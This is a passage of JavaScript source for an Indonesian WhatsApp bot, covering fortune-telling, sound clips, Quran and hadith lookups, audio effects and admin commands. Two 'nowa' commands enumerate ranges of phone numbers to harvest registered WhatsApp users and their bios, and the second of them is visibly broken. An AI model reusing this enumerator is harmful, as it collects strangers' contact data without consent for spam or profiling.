let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//════════════════════════════//
case 'sifatusaha': {
if (isBan) throw (from)

if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//════════════════════════════//
case 'rejeki': case 'rezeki': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'pekerjaan': case 'kerja': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) throw (from)

if (!text) throw `Example : 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//════════════════════════════//
case 'potensipenyakit': case 'penyakit': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'artitarot': case 'tarot': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'fengshui': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} BossRaehan, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//════════════════════════════//
case 'haribaik': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'harisangar': case 'taliwangke': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'harinaas': case 'harisial': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//════════════════════════════//
case 'nagahari': case 'harinaga': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'peruntungan': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'weton': case 'wetonjawa': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//════════════════════════════//
case 'sifat': case 'karakter': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} BossRaehan, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//════════════════════════════//
case 'keberuntungan': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} BossRaehan, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//════════════════════════════//
case 'memancing': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'masasubur': {
if (isBan) throw (from)


if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}

break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
 if (isBan) throw (from)

xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await BossRaehan.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: Raehan })
break
//════════════════════════════//
//════════════════════════════//
case 'nowa': {
if (isBan) return (from)
if (!args[0]) return anjay(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return anjay('lah?')
anjay(mess.wait)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await BossRaehan.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await BossRaehan.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
anjay(`${nomerny}${no_bio}${no_watsap}`)
}
break
//════════════════════════════//
//════════════════════════════//
case 'zodiak': case 'zodiac': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix+ command} 7 7 2005`
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'shio': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
let anu = await primbon.shio(text)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//════════════════════════════// 
//════════════════════════════//
case 'ringtone': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} black rover`
let { ringtone } = require('./DataBoss/lib/scraper')
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
BossRaehan.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: Raehan })
}
break
//════════════════════════════//
case 'iqra': {
if (isBan) throw (from)

oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
if (!text) throw oh
yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
BossRaehan.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted: Raehan}).catch ((err) => anjay(oh))
}
break
//════════════════════════════//
case 'juzamma': {
if (isBan) throw (from)

if (args[0] === 'pdf') {
BossRaehan.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted: Raehan})
} else if (args[0] === 'docx') {
BossRaehan.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted: Raehan})
} else if (args[0] === 'pptx') {
BossRaehan.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted: Raehan})
} else if (args[0] === 'xlsx') {
BossRaehan.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted: Raehan})
} else {
anjay(`Mau format apa ? Example : ${prefix + command} pdf
Format yang tersedia : pdf, docx, pptx, xlsx`)
}
}
break
//════════════════════════════//
case 'hadis': case 'hadist': {
if (isBan) throw (from)

if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1
Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
anjay(`No. ${number}
${arab}
${id}`)
} catch (e) {
anjay(`Hadis tidak ditemukan !`)
}
}
break
//════════════════════════════//
case 'alquran': {
if (isBan) throw (from)

if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
anjay(txt)
BossRaehan.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : Raehan })
}
break
//════════════════════════════//
case 'tafsirsurah': {
if (isBan) throw (from)

if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*」
*Pendek* : ${res.result.data.tafsir.id.short}
*Panjang* : ${res.result.data.tafsir.id.long}
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
anjay(txt)
}
break
//════════════════════════════//
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
if (isBan) throw (from)

let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await BossRaehan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return anjay(err)
let buff = fs.readFileSync(ran)
BossRaehan.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : Raehan })
fs.unlinkSync(ran)
})
} else anjay(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
anjay(e)
}
break
//════════════════════════════//
case 'setcmd': {
if (!isCreator) return
if (isBan) throw (from)

if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
anjay(`Done!`)
}
break
//════════════════════════════//
case 'delcmd': {
if (!isCreator) return
if (isBan) throw (from)

let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
anjay(`Done!`)
}
break
//════════════════════════════//
case 'listcmd': {
if (!isCreator) return
if (isBan) throw (from)

let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
BossRaehan.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//════════════════════════════//
case 'lockcmd': {
if (!isCreator) return
if (isBan) throw (from)

if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
global.db.data.sticker[hash].locked = !/^un/i.test(command)
anjay('Done!')
}
break
//════════════════════════════//
case 'addmsg': {
if (!isCreator) return
if (isBan) throw (from)

if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
if (!text) throw `Example : ${prefix + command} nama file`
let msgs = global.db.data.database
if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
msgs[text.toLowerCase()] = quoted.fakeObj
anjay(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//════════════════════════════//
case 'getmsg': {
if (!isCreator) return
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
BossRaehan.copyNForward(m.chat, msgs[text.toLowerCase()], true)
}
break
//════════════════════════════//
case 'listmsg': {
if (!isCreator) return
if (isBan) throw (from)

let msgs = JSON.parse(fs.readFileSync('./DataBoss/dbnye/database.json'))
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
anjay(teks)
}
break
//════════════════════════════//
case 'delmsg': case 'deletemsg': {
if (!isCreator) return
if (isBan) throw (from)

let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return anjay(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
anjay(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//════════════════════════════//

case 'public': {
if (!isCreator) return
if (isBan) throw (from)

BossRaehan.public = true
anjay('𝗣𝗨𝗕𝗟𝗜𝗖 𝗠𝗢𝗗𝗘')
}
break
//════════════════════════════//
case 'self': {
if (!isCreator) return
if (isBan) throw (from)

BossRaehan.public = false
anjay('𝗦𝗘𝗟𝗙 𝗠𝗢𝗗𝗘')
}
break
//════════════════════════════//
case 'nowa':
if (!isCreator) return
if (isBan) throw (from)

var teks = body.slice(6)
if (!teks) return anjay("lah?")
var numberPattern = /\d+/g;
var nomer = teks.match(numberPattern)
var random_length = teks.length - nomer[0].length;
if (random_length == 1) {
    var random = 10
} else if (random_length == 2) {
    var random = 100
} else if (random_length == 3) {
    var random = 1000
} else if (random_length == 4) {
    var random = 10000
}
console.log(random)
var nomerny = `List Nomer\n`
for (let i = 0; i < random; i++) {
    var nu = ['1','2','3','4','5','6','7','8','9']
    var dom1 = nu[Math.floor(Math.random() * nu.length)]
    var dom2 = nu[Math.floor(Math.random() * nu.length)]
    var dom3 = nu[Math.floor(Math.random() * nu.length)]
    var dom4 = nu[Math.floor(Math.random() * nu.length)]
    if (random_length == 1) {
var rndm = `${dom1}`
var gdaftar = []
    } else if (random_length == 2) {
rndm = `${dom1}${dom2}`
    } else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
    } else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
    }
    var anu = await BossRaehan.getName(`${nomer[0]}${i}@s.whatsapp.net`);
    var bionye = await BossRaehan.setStatus(`${nomer[0]}${i}@s.whatsapp.net`);
    var anuu = anu ? anu : false;
    try {
if (nomerny.includes(m.quoted.sender("@")[0])) {
//console.log(i)
} else {
nomerny += `NO: wa.me/${m.quoted.sender("@")[0]}\nBIO: ${bionye.status}\n\n`
}
    } catch {
console.log(i)
    }
}
anjay(nomerny)
console.log("Done dump")
break
case 'ping': case 'botstatus': case 'statusbot': {
if (isBan) throw (from)

const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
